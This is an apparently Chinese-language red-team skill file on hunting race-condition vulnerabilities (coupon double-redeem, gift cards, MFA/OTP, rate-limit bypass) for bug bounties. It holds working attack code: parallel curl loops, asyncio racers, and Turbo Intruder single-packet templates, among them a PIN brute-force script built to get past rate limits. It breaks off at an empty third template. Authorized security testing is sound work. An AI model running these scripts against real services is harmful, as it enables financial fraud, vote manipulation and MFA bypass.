---
name: hunt-race-condition
description: "针对竞态条件漏洞的狩猎技能。基于 12 份公开漏洞赏金报告构建，包括现代 HTTP/2 单包攻击案例（James Kettle 在 DEF CON 2023 的 \"Smashing the State Machine\"；RyotaK / Flatt Security 2024 年的 10,000 请求首序列同步扩展）。涵盖优惠券重复核销、礼品卡重复消费、MFA-OTP-校验竞态、账户创建竞态、faucet/加密代币重复铸造、邮件激活竞态、投票/点赞膨胀、密码重置令牌竞态、通过并发请求绕过速率限制。适用于狩猎竞态条件、TOCTOU 缺陷、通过时序绕过 MFA。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [race-condition, hunt, redteam]
  category: redteam
---

## When to Use

- 狩猎竞态条件、TOCTOU 缺陷、通过时序绕过 MFA。

## Prerequisites

- 针对目标的明确授权、目标边界和速率限制。
- 工具：`curl`。
- 可写证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何会改变状态的步骤（写入、上传、凭据尝试），在命令执行前立即获得明确确认。

## How to Run

```bash
# Fire 15 simultaneous vote/redeem requests
for i in $(seq 1 15); do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}\n" \
    -X POST "https://target.com/api/vote" \
    -H "Cookie: session=YOUR_SESSION" \
    -H "Content-Type: application/json" \
    -d '{"report_id": "12345", "vote": "up"}' &
done
wait
```

## Procedure

下文各阶段即为操作流程。保持每个探测请求有界（`--max-time`），将证据记录到 `OUTPUT_DIR` 下，并在 Pitfalls 中列出的停止条件处停止。

## 高价值目标

竞态条件属于高严重性发现，因为它们打破了防守方很少做压力测试的财务、访问控制和完整性假设。最高报酬来自：

- **货币/信用系统** — 重复消费礼品卡、优惠券、推荐奖励、促销积分、钱包余额
- **投票/声誉操纵** — 对同一内容多次点赞，操纵排行榜或热门算法
- **账户限制绕过** — 超出免费套餐配额，绕过邀请、试用激活或 API 密钥生成上的“每用户一次”限制
- **权限提升** — 在用户创建/升级流程中竞态角色分配或权限检查
- **删除绕过** — 在“标记为删除”与“实际删除”之间的狭窄窗口内读取或窃取数据
- **支付流程** — 只向卡扣款一次，却获得多次履约

**报酬最高的资产类型：** 金融科技应用、带有信用/订阅模式的 SaaS 平台、带有声誉系统的社交平台、电商结账流程、OAuth/SSO 令牌端点。

---

## 攻击面信号

### URL 模式
```
/vote, /upvote, /like, /favorite
/redeem, /apply-coupon, /use-code, /claim
/purchase, /checkout, /confirm-order, /pay
/transfer, /withdraw, /send-money
/invite, /referral, /accept-invite
/upgrade, /activate, /trial
/delete, /deactivate, /cancel
/follow, /subscribe
```

### 指示后端易受竞态影响的响应头
```
X-RateLimit-*        # rate limiting exists, but may not be atomic
X-Request-Id         # each request independently tracked
No Cache-Control     # stateful ops not idempotent
```

### 需要 Grep 的 JavaScript 模式
```javascript
// Single-use action buttons with client-side disable
button.disabled = true
$('#btn').prop('disabled', true)
// Optimistic UI updates (state set before server confirms)
setState({ used: true })
// Sequential async calls without locking
await useVoucher(); await deductBalance();
```

### 技术栈信号
- **Ruby on Rails** 未使用 `with_lock` / `lock!` — ActiveRecord 默认不加锁
- **Node.js** 使用 async/await 链 — 先读后写的数据库操作非原子
- **PHP** 未使用 `SELECT ... FOR UPDATE` — 在遗留代码库中很常见
- **微服务** — 服务间调用天然引入了 TOCTOU 窗口
- **Redis 计数器** 未使用 Lua 脚本或 `INCR` 原子性检查
- **消息队列** — 幂等键经常缺失

---

## 分步狩猎方法论

1. **枚举一次性或有限次操作** — 梳理每一个强制执行“每用户一次”“数量有限”或“扣减余额”约束的端点。这些是你的主要目标。

2. **理解状态机** — 对于每个目标操作，识别：(a) 读取了什么状态，(b) 写入了什么状态，(c) 读与写之间有哪些校验。读与写之间的间隙就是你的窗口。

3. **捕获一份干净的基线请求** — 用 Burp Suite 拦截，合法地执行一次该操作。确认你得到预期的一次性行为（例如优惠券被标记为已使用，投票只计一次）。

4. **搭建并行请求工具** — 使用以下之一：
   - Burp Suite Repeater → "Send group in parallel"（对 HTTP/2 单包攻击使用 Turbo Intruder）
   - Turbo Intruder 配合 `engine=Engine.BURP2` 实现 last-byte sync
   - `curl` 配合 `&` 后台执行
   - Python `threading` 或 `asyncio`，使用预先建立好的连接

5. **执行竞态** — 同时发送 10–50 个相同的请求。关键技术：**预先连接并缓冲所有请求，同时释放所有请求的最后一个字节**（在支持 HTTP/2 时使用单包攻击）。

6. **分析响应** — 关注：
   - 本应只有一个成功的场景出现多个 `200 OK`
   - 重复的成功消息
   - 数据库约束错误（表明竞态生效但撞上了最后一道防线）
   - 不一致的响应时间（一个快、其余慢 = 串行化；速度全部相同 = 并行处理）

7. **验证效果** — 检查实际状态：积分是否被应用了两次？投票数是否增加了多次？尽管出现两次成功，优惠券是否仍被标记为未使用？

8. **确定可利用窗口** — 用递减的并发量重跑（5 个请求、3 个请求、2 个请求），以了解窗口有多窄以及利用的可靠性。

9. **跨账户类型测试** — 有时竞态只对新账户、特定订阅层级或在特定服务器负载下生效。测试多种条件。

10. **记录可复现性** — 在报告之前，记录精确时序、所需的并行请求数，以及 5 次独立尝试中的成功率。

---

## Payload 与检测模式

### Turbo Intruder — 基础并行竞态
```python
# turbo_intruder_race.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2 single-packet
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)
```

### curl — 并行请求（bash）
```bash
# Fire 15 simultaneous vote/redeem requests
for i in $(seq 1 15); do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}\n" \
    -X POST "https://target.com/api/vote" \
    -H "Cookie: session=YOUR_SESSION" \
    -H "Content-Type: application/json" \
    -d '{"report_id": "12345", "vote": "up"}' &
done
wait
```

### Python asyncio 竞态
```python
import asyncio, aiohttp

async def race_request(session, url, payload, headers):
    async with session.post(url, json=payload, headers=headers) as r:
        return await r.text()

async def main():
    url = "https://target.com/redeem"
    payload = {"code": "GIFT50"}
    headers = {"Cookie": "session=XXXXX"}

    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, payload, headers) for _ in range(20)]
        results = await asyncio.gather(*tasks)

    for r in results:
        print(r[:100])  # print first 100 chars of each response

asyncio.run(main())
```

### 用于源码审计的 Grep 模式
```bash
# Look for read-then-write without locking
grep -rn "find_by\|where.*first" --include="*.rb" | grep -v "lock"
grep -rn "SELECT.*WHERE" --include="*.php" | grep -v "FOR UPDATE"

# JavaScript async without atomicity
grep -rn "await.*get\|await.*find" --include="*.js" -A2 | grep "await.*update\|await.*save"

# Python Django ORM without select_for_update
grep -rn "\.get(\|\.filter(" --include="*.py" | grep -v "select_for_update"
```

### HTTP/2 单包检查
```bash
# Verify target supports HTTP/2 (prerequisite for single-packet attack)
curl --max-time 30 --connect-timeout 10 -sI --http2 https://target.com | grep -i "HTTP/2\|h2"
```

---

## 常见根因

1. **检查后执行（Check-Then-Act）缺少原子操作** — 开发者读取状态（`if voucher.used == false`），然后在两个独立的数据库操作中写入状态（`voucher.update(used: true)`）。任何线程都可以在任意一方写入之前读到相同的“未使用”状态。

2. **缺少数据库层锁** — 使用 `find` 或 `filter` 这类 ORM 方法，而不是 `SELECT ... FOR UPDATE`。修复只需一行，但开发者不会考虑并发问题。

3. **乐观并发缺少版本检查** — 系统递增计数器或标记记录时，不检查该记录自读取以来是否已发生变化。

4. **微服务 TOCTOU** — 服务 A 校验资格，服务 B 执行操作。没有跨越两个服务的共享原子事务。

5. **客户端“防护”** — 开发者在首次点击后用 JavaScript 禁用按钮，以为这样能防止重复提交。服务端逻辑从未加固。

6. **事务之外的计数器递增** — `votes_count += 1; save()`，而不是原子的 SQL `UPDATE SET votes = votes + 1 WHERE id = ?`。

7. **异步后台任务** — 资格同步检查，履约异步执行。第二个请求在第一个任务完成之前通过了检查。

8. **缓存未失效** — 当第一次写入尚未传播时，缓存的“用户是否已投票？”检查在缓存未命中的窗口内返回过期的 `false`。

---

## 绕过技术

### 防守方实现了什么（以及如何绕过）

**防护：按用户速率限制**
- 绕过：速率限制在执行操作之前检查。同时发送请求 — 所有请求都在任何一个被计数之前通过了速率限制检查。

**防护：幂等键 / 唯一请求令牌**
- 绕过：如果服务器生成或复用该令牌，尝试在不带令牌的情况下发送并行请求。或者检查唯一性检查本身是否存在竞态窗口。

**防护：数据库唯一约束**
- 绕过：该约束在竞态*之后*才捕获重复。前两个请求可能在数据库强制执行之前都成功。留意部分履约 — 有时一个成功、一个报错，但两者都被认可。

**防护：短时间窗口 / 过期令牌**
- 绕过：用有效令牌预置所有请求。使用单包 HTTP/2 在一个 TCP 帧中释放全部请求 — 服务器会在同一个调度槽中处理它们。

**防护：基于队列的串行化**
- 绕过：多个队列（或多个消费同一队列的 worker）可能取到重复消息。通过在窗口期内压垮队列来测试。

**防护：应用层互斥锁 / 锁**
- 绕过：运行多个应用服务器的分布式系统不共享进程内锁。通过不同 CDN 节点或负载均衡服务器向同一端点发送请求。

**防护：应用代码中的“已使用”检查**
- 绕过：检查与更新是分开的。两个竞态请求都会在任一更新完成之前通过检查。只有原子的 `UPDATE ... WHERE used=false RETURNING id` 才能真正防止这一点。

---

## Gate 0 验证

在撰写报告之前，确认以下三项全部成立：

1. **攻击者现在能做什么？**
   你能否用截图或日志证明同一个一次性操作成功执行了多次？（例如投票数显示来自单个用户的 +2，信用余额显示双重入账，优惠券显示被核销了两次）

2. **受害者损失了什么？**
   是否存在具体、可量化的损害？财务损失（超额发放积分）、完整性损失（被操纵的排名/投票）或安全损失（获得超出权限的访问）？“计数器增加了两次”只有在那个计数器具有现实价值时才成立。

3. **能否在 10 分钟内从零复现？**
   你能否编写一个 20 行的脚本，对全新的测试账户运行，并在 5 次尝试中至少 3 次可靠地证明重复效果？如果它需要你无法可靠控制的完美时序，那么可利用性的主张就很弱。

---

## 真实影响示例

### 场景 1：社交平台投票操纵
某漏洞赏金平台的“热门报告”功能允许点赞以提高报告可见度和研究员声誉分数。通过使用单个 HTTP/2 连接（单包攻击）对同一报告发送约 15 个并行点赞请求，一名研究员能够从单个账户登记 10–15 票。这导致报告排名被人为抬高、研究员声誉分数被操纵，并扭曲了平台众包式的优先级排序系统 — 直接削弱了对该平台漏洞报告分诊这一核心功能的信任。

### 场景 2：大型社交网络 — 重复促销操作
在一个大型社交网络（Facebook 级别）上，促销或有限次操作 — 例如添加手机号以获取一次性安全积分，或领取一次性奖励 — 容易受到同时并行请求的攻击。攻击者可以竞态领取端点并多次获得促销利益，从而给平台造成直接财务损失，并允许大规模欺诈性积累平台货币或权益。考虑到用户量，即使在修补前的短暂窗口也意味着重大的财务风险敞口。

### 场景 3：云基础设施提供商 — 资源限制绕过
某云托管提供商对免费套餐用户可创建的资源数量（例如 droplets、项目或 API 密钥）实施限制。限制检查与资源创建是非原子操作。通过用 20 个同时请求竞态创建端点，攻击者绕过了限制逻辑，创建了远超其套餐上限的资源。这直接转化为未授权的计算资源消耗、账单欺诈和基础设施滥用 — 同时影响了提供商的收入和合法用户的系统稳定性。

---

## 已披露报告引用（补录 +9 — 2016-2024）

以下真实、经过验证的漏洞赏金 / 协调披露案例扩展了本技能。其中四个案例（#4、#11、#12，以及附赠参考）使用了现代 **HTTP/2 单包攻击**技术（Kettle DEF CON 31，2023；Flatt Security 2024 扩展）— 正是这项技术让大多数现代竞态利用在今天变得可行。

4. **GitLab — CVE-2022-4037 邮件验证竞态（Kettle DEF CON 31 案例研究）**（[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-4037) · [PortSwigger Research](https://portswigger.net/research/smashing-the-state-machine)）
    - 子类：密码重置 / 邮箱变更令牌竞态（邮件验证上的 TOCTOU）
    - 单包 HTTP/2：**是** — "Smashing the State Machine" 中的旗舰案例研究
    - Payload：两个并发的 `POST /-/profile` 请求将邮箱改为两个不同地址；由于状态转换不是原子的，发送到地址 A 的验证令牌对地址 B 变得有效
    - 根因：Devise（Rails 认证）在新邮箱持久化之前就构建了确认令牌；并发更新导致令牌路由错误
    - 年份：2022（2023 年披露），CVSS 6.4，修复于 15.7.2 / 15.6.4 / 15.5.7

5. **Worldcoin（Tools for Humanity）— World ID 操作验证竞态**（[Medium 文章](https://medium.com/@gonzo-hacks/the-fast-and-the-curious-finding-a-race-condition-in-worldcoin-621c89bfbd61)）
    - 子类：投票/点赞膨胀（绕过“一人一操作”的执行）
    - Payload：通过 Burp "Send in Parallel" 向验证端点发送约 20 个并行请求
    - 根因：`canVerifyForAction` 在无数据库级锁的情况下追加到数组；修复方案新增了带原子 UPSERT 的 `nullifiers` 表
    - 年份：2023 — **$3,000**（High）

6. **Stripe — 促销码被超额核销**（[H1 #1717650](https://hackerone.com/reports/1717650)）
    - 子类：优惠券重复核销
    - Payload：创建一个核销上限为 1 的促销码；打开同一商户的两个支付链接标签页，两边都应用该优惠券，同时点击 Pay → 两者都成功
    - 根因：核销计数器在扣款之后才递增，而非与扣款原子地一起完成；对 `promotion_code.times_redeemed` 没有行级锁
    - 年份：2022 — **$250**

7. **Stripe — 手续费折扣被多次核销**（[H1 #1849626](https://hackerone.com/reports/1849626)）
    - 子类：钱包/余额重复消费（Connect 手续费折扣可被反复核销）
    - Payload：在一次性促销信用的已消费标志翻转之前，向核销端点发送并行的 POST 请求
    - 根因：对信用余额对象的“先检查后递减”非原子
    - 年份：2023 — **$5,000**，每次核销造成约 $600 的平台手续费损失

8. **marketplace.example.com — 礼品卡多重核销**（[H1 #759247](https://hackerone.com/reports/759247)）
    - 子类：优惠券重复核销（礼品卡）
    - Payload：抓取 `POST /gift_cards/redeem` → 复制 N 份 → 并行发送 → 单张卡导致余额入账 N 次
    - 根因：礼品卡消费标记在余额入账之后才写入，核销读取周围缺少 `SELECT…FOR UPDATE`
    - 年份：2019 — **$1,500**（基础性/被广泛引用）

9. **Cosmos / Starport faucet — 双重铸造竞态**（[H1 #1438052](https://hackerone.com/reports/1438052)）
    - 子类：钱包/余额重复消费（加密 faucet 代币发放）
    - Payload：同时发送 `/faucet/transfer` 请求；`Transfer` Go 函数每个请求执行两个改变状态的动作，二者都非原子
    - 根因：faucet 处理器未对每个收款人加锁；transfer() 的读-改-写未串行化
    - 年份：2022 — **$5,000**（CVSS 9.3）

10. **InnoGames — 邮件激活竞态 → 无限钻石**（[H1 #509629](https://hackerone.com/reports/509629)）
    - 子类：推荐滥用倍增 / 账户创建竞态（一个激活令牌 → 多次“首次激活奖励”发放）
    - Payload：在 `token_used` 标志提交之前，用同一个一次性令牌竞态邮件激活端点 → 每个成功的请求都会发放奖励
    - 根因：令牌消费标志与奖励发放设置在同一事务中，但事务隔离级别过低（READ COMMITTED）
    - 年份：2019 — **$2,000**

11. **RyotaK / Flatt Security — "First Sequence Sync" PIN 暴力破解（10,000 请求单包扩展）**（[Flatt Security Research](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)）
    - 子类：通过竞态绕过速率限制 / MFA-OTP-校验竞态（6 位 PIN，限 5 次尝试）
    - 单包 HTTP/2：**是** — 通过同步 TCP 首序列号拆分 IP 分片，将 Kettle 的单包从约 30 个请求扩展到 166 ms 内 10,000 个请求
    - Payload：在 166 ms 内发起约 10,000 个并发 `POST /verify-pin` 请求，每个都带一个不同的 4-6 位猜测，全部落在速率限制窗口内
    - 根因：速率限制计数器按请求异步递增；“5 次尝试”门槛在整个批次读取的是过期计数器
    - 年份：2024 — **必须参考的现代单包示例**

12. **nopCommerce — CVE-2024-58248 礼品卡重复核销**（[NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-58248)）
    - 子类：优惠券重复核销（电商结账 TOCTOU）
    - 单包 HTTP/2：**是** — 单包攻击可稳定复现
    - Payload：两个并行的 `POST /checkout/PlaceOrder` 请求都使用同一张礼品卡 → 两个订单都完成，而礼品卡余额只扣减一次
    - 根因：下单代码路径未对礼品卡余额行实现加锁 → 先检查后扣减非原子
    - 年份：2024（4.80.0 之前的版本）

---

## HTTP/2 单包攻击 — 深度参考

单包攻击是自 2020 年以来发表的最重要的竞态条件技术。它将竞态窗口从“受 TCP 握手抖动影响的数十毫秒”压缩到“服务器 worker 池分发 N 个已预缓冲请求所需的时间” — 整个批次通常**不到 1 ms**。正是这一点让现代竞态利用能够对付以往看似无法竞态的、带速率限制的分布式负载均衡后端。

原始研究：**James Kettle，PortSwigger — "Smashing the State Machine"（DEF CON 31，2023 年 8 月）** [portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)。2024 年扩展：**RyotaK / Flatt Security — "Beyond the Limit: Expanding Single-Packet Race Condition with First Sequence Sync"** [flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)。

### 原理 — 架构

竞态利用失败有两个原因，它们看起来是同一个问题，但其实不是：
1. **网络抖动** — 通过同一 TCP 连接顺序发送的 N 个请求，到达服务器时会根据 RTT 和拥塞情况产生 0.5–5 ms 的散布。
2. **服务端分发顺序** — 即使所有 N 个请求在同一毫秒内到达，worker 池也可能通过负载均衡器或 accept 队列将它们串行化。

单包攻击通过利用 HTTP/2 的两个协议层事实来解决 (1)：

- HTTP/2 在一条 TCP 连接上多路复用 N 个请求，每个请求批次作为一个 TLS 记录。
- TLS 记录可以承载多个 HTTP/2 `HEADERS` 帧，而每个 HEADERS 帧可以作为独立流的最后一帧。

因此，如果你在单条 HTTP/2 连接上预置 N 个请求 — **发送所有 HEADERS 帧，但保留每个请求的最后一个字节，然后在一次 TCP 写入中释放所有最后一个字节** — TCP 协议栈会将它们装入**一个 IP 包**（假设小于 MTU，约 1500 字节）。服务器内核在同一个调度 tick 中把所有 N 个请求交给 HTTP/2 解析器。竞态窗口不再是网络 — 而是应用自身的原子性失效窗口。

对于 (2) — 服务端分发顺序 — Kettle 表明，现代后端（Node.js、Go、异步 Python）在收到一个包含 N 个已解析请求的数据包时，会在微秒级内并发分发。较旧的阻塞式后端（默认 Apache prefork、单线程 PHP-FPM）即使以单包方式送达也会串行处理；对它们而言，该技术帮助较小，但仍优于 TCP 流顺序发送。

### Last-byte-sync 技术

Kettle 记录的确切机制：

1. 打开一条 HTTP/2 连接。协商 TLS，发送 SETTINGS 帧，接受服务器的 SETTINGS 帧。
2. 对于 N 个请求中的每一个，发送其 `HEADERS` 帧**并带上 END_HEADERS 标志**，以及一个包含**除请求体最后一个字节之外全部内容**的 `DATA` 帧。此时不要设置 END_STREAM。
3. 服务器无法分发该请求，因为 END_STREAM 尚未触发 — 它还在等待再多一个字节。
4. 在同一条连接上对所有 N 个请求重复步骤 (2)。现在每个请求都已在服务器端缓冲，“几乎完成”地解析。
5. **在一次 TCP 写入中，发送 N 个微小的 `DATA` 帧，每个携带 1 个字节并设置 END_STREAM。** TCP 会将它们合并成一个出站段。服务器的 HTTP/2 解析器在同一个调度 tick 中看到所有 N 个流上的 END_STREAM。
6. 服务器在微秒级内将 N 个请求分发给 N 个 worker。

竞态窗口等于 worker N 的 `SELECT ... FOR UPDATE` 与 worker N+1 执行同一查询之间的时间 — 当 worker 运行在同一 CPU 上时通常是纳秒级。

### Wireshark 验证

为确认你的攻击工具确实产生了单包同步（而不是意外分片）：

1. 在攻击期间抓取回环或你的出口网卡：`sudo tcpdump -i lo0 -w race.pcap port 443`（或 interface 0）。
2. 在 Wireshark 中打开，过滤 `tls and tcp.port == 443`。
3. 找到包含 END_STREAM 刷写的那条 TLS 记录。它应当包含**一个 TCP 段、一条 TLS 记录内的 N 个设置了 END_STREAM 的 H2 DATA 帧。**
4. 如果你看到 N 条 TLS 记录或 N 个 TCP 段，说明你的工具在顺序发送。竞态窗口就是段之间的间隙 — 通常太宽。

当请求体适配 MTU 时，Turbo Intruder 的 `engine=Engine.BURP2` 实现会保证在 HTTP/2 目标上实现单包送达。对于更大的请求体，请参见下文的“竞态窗口估算”小节。

### h2.0 单帧 vs h2.cl 多帧竞态

取决于目标所说的协议，有两种变体：

- **h2.0 单帧**（标准的 Kettle 攻击）：端到端纯 HTTP/2。N 个请求在一条 TLS 记录中。适用于任何在前端通过 ALPN 通告 `h2` 的现代 HTTPS 目标。**默认方法。**
- **h2.cl 多帧**：前端对客户端说 HTTP/2，对后端降级为 HTTP/1.1。与请求走私相近 — 你构造一个 HTTP/2 请求，其 `Content-Length` 使前端误以为要向同一连接上的后端发出两个 HTTP/1.1 请求。可与 HTTP 请求走私配合（参见 `hunt-http-smuggling`）。当前端过滤了单包 HTTP/2、但后端可通过 HTTP/1.1 触达时有用。

通过 `curl -sI --http2 https://target.com | grep -i HTTP/2` 检测 h2.0 的可行性。如果服务器不说 h2，单包攻击不能直接适用 — 退回到 HTTP/1.1 上的“并行流水线”（竞态窗口宽得多；通常会在与现代后端的竞态中落败，但对朴素后端仍然有用）。

### 竞态窗口估算方法

在发起攻击之前，先估算竞态窗口。这决定了你是否需要单包攻击，以及要发送多少个并发请求。

1. 向目标端点发出**一个**请求。记录线上的响应时间：`T_single`。
2. 发出**两个顺序**请求。记录两个响应时间：`T_seq1`、`T_seq2`。
3. 在同一连接上发出**两个并发**请求（通过 HTTP/2 多路复用或 HTTP/1.1 流水线）。记录两者：`T_par1`、`T_par2`。
4. 如果 `T_par1 ≈ T_par2 ≈ T_single`，服务器并行处理两者 — 竞态窗口为 `min(T_par1, T_par2)`，单包攻击帮助很大。
5. 如果 `T_par2 ≈ T_par1 + T_single`，服务器串行处理 — 竞态窗口就是顺序 worker 之间发生的任何事；单包攻击帮助较小，但仍优于 TCP 抖动。
6. 对于 PIN / OTP / 优惠券核销端点，预计 `T_single` 为 10–100 ms（数据库查询延迟）。服务器内部的竞态窗口通常 < 1 ms（同一行上 `SELECT` 与 `UPDATE` 之间的间隙）。
7. **N 的经验法则：** 单包 h2 从 `N = 30` 个并发请求开始。如果目标的 `T_single` < 10 ms（非常快的端点 = 需要更大的预缓冲来溢出 worker 池），增加到 100+。使用 Flatt 的首序列同步扩展最多可达 **10,000**（见下文）。

### 单连接多流 vs 多连接单流

选择合适形态的决策树：

- **单连接，N 个流**（默认 Kettle / Turbo Intruder BURP2 引擎）：一条 TCP 连接上的 N 个并发 HTTP/2 流。**使用场景：** 目标说 HTTP/2；请求体适配 MTU（TLS 开销之后约 1400 字节）；你需要 N ≤ 约 30。
- **多连接，各一个流**（较旧的并行 HTTP/1.1）：N 条 TCP 连接，每个连接一个请求。**使用场景：** 目标不说 HTTP/2，或者请求体很大（> MTU）。竞态窗口显著变宽（5–50 ms 的 TCP 握手散布）— 只对慢速服务器可行。
- **多连接，多流**（Flatt 的首序列同步，2024）：N 条 TCP 连接，每条承载 M 个流。总数 = N×M 个请求。利用跨多条连接的同步 TCP 首序列号，使所有数据包在同一个处理窗口内到达服务器。**使用场景：** 你需要 N > 30（例如在 5 次尝试的速率限制窗口内暴力破解 6 位 PIN — Flatt 通过同步 SEQ 号拆分 IP 分片，演示了 166 ms 内 10,000 个请求）。

### Turbo Intruder `Engine.BURP2` 模板 — 详解

```python
def queueRequests(target, wordlists):
    # 1. Engine.BURP2 = HTTP/2 single-packet engine; provides the last-byte-sync primitive.
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,          # 2. One TCP connection, multiplexing all streams.
        requestsPerConnection=100,        # 3. Up to 100 concurrent H2 streams. >30 needs Flatt-extension.
        engine=Engine.BURP2,              # 4. THE critical line — selects the single-packet engine.
        pipeline=False,                   # 5. Pipelining is for HTTP/1.1; irrelevant on H2.
    )

    # 6. Build N requests. Each is identical here — racing the same endpoint.
    #    For PIN brute-force, vary the body across requests.
    for i in range(30):
        engine.queue(target.req)

    # 7. openGate(...).complete(...) is the API call that performs last-byte-sync:
    #    - Buffer all 30 requests up to "last byte not sent"
    #    - Release all final bytes in a single TCP write
    #    - openGate returns immediately; complete waits for all responses.
    engine.openGate("race1")
    engine.complete(timeout=10)
```

`Engine.BURP2` 的导入完成了繁重的工作。在底层：
- 每次 `engine.queue(req)` 都会向连接的发送缓冲区添加一个 HEADERS 帧，但保留最后一个 DATA 帧字节不发。
- `openGate("race1")` 会阻塞直到 30 个请求全部缓冲完毕，然后发出一次 `socket.send(...)`，其中包含 30 个带 END_STREAM 的 1 字节 DATA 帧。所有 30 个请求都在一个 IP 包中经过网络（假设 < MTU）。
- `complete(timeout=10)` 收集响应和耗时。

检查每个响应对象：`req.code`、`req.length`、`req.time`。当至少 2 个请求返回了逻辑上本应互斥的成功（例如核销上限为 1 时两个优惠券应用都成功）时，竞态就被“赢下”了。

### Flatt 的首序列同步扩展（需要 N > 30 时）

Kettle 的原始单包受 MTU + TLS 记录限制，上限约为 N=30。Flatt Security 的 RyotaK 于 2024 年 8 月发表了该扩展：

- 利用 IP 分片：IP 层的一个“逻辑”数据包可以拆分成多个物理 IP 分片。
- 通过同步完成 TLS 握手并对齐 SYN/SYN-ACK 时序，强制跨多条连接使用同步的 TCP SEQ 号。
- 结果：10,000 个并发请求在 166 ms 内送达服务器，全部落在服务器以为是原子的速率限制窗口内。

用例：在每窗口限 5 次的限制内暴力破解 6 位 PIN（最多 10^6 个候选）。没有首序列同步，你大约需要 200,000 个窗口。有了它，约 100 个窗口。

实现：[flatt.tech/research/posts/beyond-the-limit-...](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) 包含可用的 PoC。

### 操作手册（何时使用哪种）

| 场景 | 工具 / 变体 |
|---|---|
| 现代 HTTPS 目标，ALPN 通告 `h2`，请求体 < 1400 字节，需要 N ≤ 30 | Turbo Intruder `Engine.BURP2` 单包 — **默认** |
| 同上但请求体 > MTU | 多连接 HTTP/2；窗口估算放宽约 5 ms |
| 目标只说 HTTP/1.1（无 h2 ALPN） | `curl --next` 并行流水线；竞态窗口很宽；仅对慢速服务器可行 |
| 需要 N > 30（PIN 暴力破解、在速率限制窗口内耗尽 OTP） | Flatt 首序列同步扩展；按文章手动实现 |
| 前端 h2、后端 h1（CDN+源站） | h2.cl 走私变体 — 与 `hunt-http-smuggling` 配合 |
| 在单个端点上做快速可复现性测试 | `curl --next --next --next --next`（4 发并行 HTTP/1.1）— 窗口宽但无需配置 |

### 反模式

- **不要仅凭在 Burp Repeater "Send group in parallel" 模式下观察到两次近乎同时的成功就声称存在“竞态条件”** — 该模式是 HTTP/1.1 上的流水线发送，带有毫秒级散布，而不是单包。分诊人员知道这一点并会降级处理。
- **对高价值竞态主张，不要在没有 Wireshark 确认的情况下提交。** 报酬最高的交付物是：PoC 视频展示 Turbo Intruder 触发 + Wireshark 抓包显示所有 N 个 END_STREAM 帧在一个 TCP 段中 + N 个本应互斥的成功响应。
- **不要对真正不存在竞态的端点使用单包攻击**（例如带行级锁和事务的端点）。窗口估算步骤的存在，就是为了在你花 2 小时构建 PoC 之前把这些过滤掉。

### 交叉引用

- `hunt-http-smuggling` — h2.cl 多帧变体
- `hunt-mfa-bypass` — OTP 速率限制窗口的单包绕过（Flatt PIN 暴力破解类别）
- `hunt-business-logic` — 优惠券 / 钱包 / 促销状态机竞态，单包攻击是其使能原语
- 上述已披露报告引用 — 引用 #4、#11、#12 是经典的单包范例（GitLab/Devise CVE-2022-4037、Flatt 10k 请求 PIN 暴力破解、nopCommerce CVE-2024-58248）

## Turbo Intruder 完整模板 — 完整 Python 代码

以下是针对每种主要竞态条件场景的、可完整运行的 Turbo Intruder `.py` 模板。
每个都是自包含的 Burp Turbo Intruder 扩展脚本 — 保存为 `.py`，在 Turbo Intruder 中加载，
并指向目标端点。

### 模板 1：基础单包竞态（优惠券 / 投票 / 核销）

```python
# turbo_basic_race.py
# Use against: coupon redemption, upvote/like, gift-card redeem, one-time actions
# Strategy: Send N identical requests in a single HTTP/2 packet. If the endpoint
# lacks atomic check-then-write, multiple succeed.
#
# Tune N: start at 20, increase to 50-100 if the server is fast (<10ms response).
# If using HTTP/1.1 only, remove engine=Engine.BURP2 line.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,           # Single TCP connection
        requestsPerConnection=100,         # H2 stream limit
        engine=Engine.BURP2,               # Single-packet engine (HTTP/2 only)
        pipeline=False,
    )
    # Queue N identical requests, all gated
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Release all final bytes in a single TCP write
    engine.openGate('race1')
    engine.complete(timeout=10)


def handleResponse(req, interesting):
    # Log all 200/201/202 responses — if count > expected_successes, race won
    if req.status in ('200', '201', '202', '204'):
        table.add(req)
```

### 模板 2：每个请求使用不同 Payload（PIN 暴力破解 / OTP 猜测）

```python
# turbo_pin_bruteforce.py
# Use against: PIN-based MFA, OTP validation, numeric codes, short tokens
# Strategy: N concurrent guesses inside a single rate-limit window.
# Requires: known target account, known PIN length (e.g., 6 digits).
# Combine with Flatt first-sequence-sync for 10,000+ concurrent guesses.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=200,
        engine=Engine.BURP2,
    )
    # Generate all 4-digit PINs (0000-9999) — 10,000 candidates
    # This would be split across multiple runs. For single-packet,
    # test batches of ~50-100 at a time.
    for pin in range(10000):
        pin_str = f"{pin:04d}"
        # Build request body with the PIN
        body = target.req.replace(b'FUZZ', pin_str.encode())
        engine.queue(body, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=30)


def handleResponse(req, interesting):
    # A non-403/non-rate-limited response signals a hit
    if req.status != '403' and req.status != '429':
        table.add(req)
```

### 模板 3：多端点竞态（存款 + 取款 / 转账 + 确认）

```python
# turbo_multi_endpoint.py
